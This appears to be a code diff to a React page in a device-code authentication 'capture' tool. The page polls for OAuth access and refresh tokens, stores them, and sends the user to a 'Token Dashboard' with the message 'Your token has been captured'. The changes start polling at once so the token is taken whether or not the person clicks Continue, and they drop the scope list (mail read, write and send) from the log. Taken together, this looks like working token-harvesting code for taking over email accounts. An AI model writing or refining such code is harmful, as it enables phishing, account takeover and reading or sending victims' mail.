@@ -22,7 +22,9 @@ export function CapturePage(): React.ReactElement {
   const [countdown, setCountdown] = useState(0);
   const [errorMsg, setErrorMsg] = useState('');
   const [pollInterval, setPollInterval] = useState(5);
-  const pollTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [authEmail, setAuthEmail] = useState('');
+  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const pollActiveRef = useRef(false);
 
   const params = new URLSearchParams(window.location.hash.replace('#capture?', '').replace('#capture', ''));
   const codeFromUrl = params.get('code');
@@ -42,8 +44,8 @@ export function CapturePage(): React.ReactElement {
       setCountdown((prev) => {
         if (prev <= 1) {
           clearInterval(timer);
-          setState('expired');
           stopPolling();
+          setState('expired');
           return 0;
         }
         return prev - 1;
@@ -57,15 +59,20 @@ export function CapturePage(): React.ReactElement {
   }, []);
 
   function stopPolling(): void {
+    pollActiveRef.current = false;
     if (pollTimerRef.current) {
-      clearInterval(pollTimerRef.current);
+      clearTimeout(pollTimerRef.current);
       pollTimerRef.current = null;
     }
   }
 
   function startPolling(dCode: string, interval: number): void {
     stopPolling();
-    pollTimerRef.current = setInterval(async () => {
+    pollActiveRef.current = true;
+
+    async function poll(): Promise<void> {
+      if (!pollActiveRef.current) return;
+
       try {
         const res = await fetch('/api/token-poll', {
           method: 'POST',
@@ -83,28 +90,57 @@ export function CapturePage(): React.ReactElement {
           resource?: string;
         };
 
-        if (data.status === 'complete' && data.accessToken) {
+        if (!pollActiveRef.current) return;
+
+        if (data.status === 'complete') {
           stopPolling();
-          await handleAuthComplete(data.accessToken, data.refreshToken ?? '', data.expiresIn ?? 3600);
+          if (data.accessToken) {
+            try {
+              await handleAuthComplete(data.accessToken, data.refreshToken ?? '', typeof data.expiresIn === 'number' ? data.expiresIn : 3600);
+            } catch (err) {
+              console.error('handleAuthComplete error:', err);
+            }
+          }
           setState('success');
-        } else if (data.status === 'expired') {
+          return;
+        }
+
+        if (data.status === 'expired') {
           stopPolling();
           setState('expired');
-        } else if (data.status === 'slow_down') {
-          stopPolling();
-          setPollInterval((prev) => prev + 5);
-          pollTimerRef.current = setInterval(() => {
-            startPolling(dCode, interval + 5);
-          }, (interval + 5) * 1000);
-        } else if (data.status === 'error') {
+          return;
+        }
+
+        if (data.status === 'slow_down') {
+          const newInterval = interval + 5;
+          setPollInterval(newInterval);
+          if (pollActiveRef.current) {
+            pollTimerRef.current = setTimeout(poll, newInterval * 1000);
+          }
+          return;
+        }
+
+        if (data.status === 'error') {
           stopPolling();
           setErrorMsg(typeof data.description === 'string' ? data.description : (data.error ?? 'Authentication failed'));
           setState('error');
+          return;
+        }
+
+        // status === 'pending' — schedule next poll
+        if (pollActiveRef.current) {
+          pollTimerRef.current = setTimeout(poll, interval * 1000);
         }
       } catch {
-        // Network error, keep polling
+        // Network error — retry after interval
+        if (pollActiveRef.current) {
+          pollTimerRef.current = setTimeout(poll, interval * 1000);
+        }
       }
-    }, interval * 1000);
+    }
+
+    // Start first poll after interval
+    pollTimerRef.current = setTimeout(poll, interval * 1000);
   }
 
   async function handleAuthComplete(accessToken: string, refreshToken: string, expiresIn: number): Promise<void> {
@@ -126,6 +162,8 @@ export function CapturePage(): React.ReactElement {
       // Profile fetch failed, use defaults
     }
 
+    setAuthEmail(email);
+
     const session = createSessionFromToken({
       accessToken,
       refreshToken,
@@ -143,7 +181,7 @@ export function CapturePage(): React.ReactElement {
       action: 'login',
       accountEmail: email,
       ipAddress: 'Web Client',
-      details: `Device code flow completed. Token expires in ${expiresIn}s. Scopes: User.Read, Mail.Read, Mail.ReadWrite, Mail.Send, MailboxSettings.Read`,
+      details: `Device code flow completed. Token expires in ${expiresIn}s.`,
       success: true,
     });
   }
@@ -164,8 +202,12 @@ export function CapturePage(): React.ReactElement {
       setUserCode(data.userCode);
       setDeviceCode(data.deviceCode);
       setCountdown(data.expiresIn);
-      setPollInterval(data.interval || 5);
+      const interval = data.interval || 5;
+      setPollInterval(interval);
       setState('code_ready');
+
+      // Start polling immediately so token is captured whether user clicks Continue or not
+      startPolling(data.deviceCode, interval);
     } catch (err) {
       setErrorMsg(err instanceof Error ? err.message : 'Network error');
       setState('error');
@@ -183,9 +225,6 @@ export function CapturePage(): React.ReactElement {
   function handleContinueToVerify(): void {
     setState('waiting');
     window.open(DEVICE_AUTH_URL, '_blank');
-    if (deviceCode) {
-      startPolling(deviceCode, pollInterval);
-    }
   }
 
   function handleReset(): void {
@@ -196,6 +235,7 @@ export function CapturePage(): React.ReactElement {
     setCopied(false);
     setCountdown(0);
     setErrorMsg('');
+    setAuthEmail('');
     window.location.hash = '#capture';
   }
 
@@ -287,7 +327,7 @@ export function CapturePage(): React.ReactElement {
 
             {state === 'waiting' && (
               <div className="capture-waiting">
-                Complete sign-in in the new tab...
+                Waiting for you to complete sign-in...
               </div>
             )}
 
@@ -307,8 +347,14 @@ export function CapturePage(): React.ReactElement {
                 </svg>
               </div>
               <h2>Authentication Successful</h2>
-              <p>Your account has been authenticated. You can now use the Outlook Electron app.</p>
-              <button className="capture-generate-btn" onClick={handleReset} style={{ marginTop: 20 }}>
+              {authEmail && authEmail !== 'unknown@user.com' && (
+                <p className="capture-auth-email">Signed in as <strong>{authEmail}</strong></p>
+              )}
+              <p>Your token has been captured and saved to the dashboard.</p>
+              <a href="#" className="capture-view-dashboard-btn" onClick={(e) => { e.preventDefault(); window.location.hash = ''; }}>
+                View Token Dashboard
+              </a>
+              <button className="capture-another-btn" onClick={handleReset}>
                 Sign in another account
               </button>
             </div>
